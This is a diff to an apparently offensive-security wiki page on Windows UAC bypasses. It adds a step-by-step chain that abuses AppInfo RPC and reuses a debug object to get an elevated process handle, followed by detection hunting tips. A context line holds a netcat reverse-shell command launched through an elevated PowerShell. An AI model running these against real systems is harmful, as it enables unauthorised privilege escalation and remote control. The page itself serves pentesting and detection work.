@@ -126,6 +126,20 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
+### Local RPC + reusable debug object
+
+The AppInfo local RPC interface `201ef99a-7fa0-444c-9399-19ba84f12a1a` can create a process with debugging enabled. Processes debug-created on the same thread share the thread's debug object; a creation debug event carries a full-access process handle even when the RPC result itself grants only limited access. This turns debug-object reuse into a UAC primitive for a medium-integrity member of the Administrators group.<sup>[[11]](#references)[[12]](#references)</sup>
+
+A practical chain is:<sup>[[11]](#references)[[12]](#references)</sup>
+
+1. Call the local RPC method (directly or through `NdrAsyncClientCall`) to create a non-elevated sacrificial process with debugging enabled.
+2. Query `ProcessDebugObjectHandle` with `NtQueryInformationProcess`, detach it with `NtRemoveProcessDebug`, retain the object, and terminate the sacrificial process.
+3. Use the same RPC interface to create a trusted auto-elevated process, then associate the saved object with the calling thread through `DbgUiSetThreadDebugObject`.
+4. Call `WaitForDebugEvent` and take the `CREATE_PROCESS_DEBUG_EVENT` process handle; duplicate it with `NtDuplicateObject` before continuing.
+5. Supply the duplicated handle to `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` and launch the payload with an extended startup-info structure. This both reuses the elevated process context and gives the child a trusted-looking parent relationship.
+
+Hunt for the short sequence rather than only the auto-elevated binary: local AppInfo RPC process creation, `ProcessDebugObjectHandle` queries, debugger detach/reattach, an immediate creation-debug event, handle duplication, and a child whose recorded parent does not match the process that performed the creation APIs.<sup>[[12]](#references)</sup>
+
 ### **Very** Basic UAC "bypass" (full file system access)
 
 If you have a shell with a user that is inside the Administrators group you can **mount the C$** shared via SMB (file system) local in a new disk and you will have **access to everything inside the file system** (even Administrator home folder).
@@ -404,4 +418,6 @@ logman stop AdminProtectionTrace -ets
 - [8] [Sigma / Detection.FYI – Bypass UAC Using SilentCleanup Task](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
 - [9] [R41N3RZUF477 – UnifiedConsent, TabTip and Narrator Always Notify bypasses](https://github.com/hfiref0x/UACME/issues/173)
 - [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
+- [11] [Google Project Zero – Calling Local Windows RPC Servers from .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
+- [12] [Kaspersky Securelist – HoneyMyte Enhances CoolClient with a Signed Windows Kernel Rootkit](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
 {{#include ../../banners/hacktricks-training.md}}
